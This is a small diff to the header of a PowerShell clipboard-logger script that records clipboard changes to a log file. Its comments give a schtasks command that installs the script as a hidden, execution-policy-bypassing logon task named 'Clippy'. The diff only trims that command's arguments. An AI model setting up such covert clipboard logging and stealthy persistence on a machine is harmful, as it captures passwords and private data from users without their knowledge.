@@ -2,7 +2,7 @@
 # Checks clipboard, and compares with stored variable
 # If different, log clipboard and change stored variable to content
 # Install (Terminal, run as admin):
-# schtasks /create /sc ONLOGON /tn Clippy /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\emythiel\Downloads\NotMalware\clipboard_logger.ps1" /ru %USERNAME% /it
+# schtasks /create /sc ONLOGON /tn Clippy /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\emythiel\Downloads\NotMalware\clipboard_logger.ps1"
 
 # Set script path and logfile path
 $scriptPath = Split-Path $MyInvocation.MyCommand.Path -Parent
